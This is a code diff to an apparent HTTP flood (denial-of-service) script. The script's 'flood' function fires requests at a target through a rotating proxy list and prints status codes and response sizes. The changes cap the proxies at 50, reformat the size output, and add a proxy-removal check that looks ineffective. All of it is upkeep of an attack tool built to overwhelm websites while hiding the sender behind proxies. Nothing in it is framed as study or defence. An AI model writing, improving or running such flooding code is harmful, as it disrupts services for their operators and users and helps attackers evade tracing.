@@ -23,6 +23,7 @@ with requests.get(
     for proxy in proxies.text.split("\r\n"):
         if proxy != "":
             proxies_.append({"http": proxy, "https": proxy})
+    proxies_ = proxies_[:50]
 
 headers = {
     "X-Requested-With": "XMLHttpRequest",
@@ -59,8 +60,12 @@ def flood(target: str, use_proxy: bool) -> None:
         CriticalError("There was an error during the HTTP attack", err)
     else:
         status = f"{color_code[r.status_code == 200]}Status: [{r.status_code}]"
-        payload_size = f"{Fore.CYAN} Requested Data Size: {len(r.content)/1000:>10} KB"
+        payload_size = (
+            f"{Fore.CYAN} Requested Data Size: {round(len(r.content)/1024, 2):>6} KB"
+        )
         proxy_addr = f"| {Fore.CYAN}Proxy: {proxy['http']:>21}" if use_proxy else ""
         print(
             f"{status}{Fore.RESET} --> {payload_size} {Fore.RESET}{proxy_addr}{Fore.RESET}"
         )
+        if not r.status_code:
+            proxies_.remove(proxy)
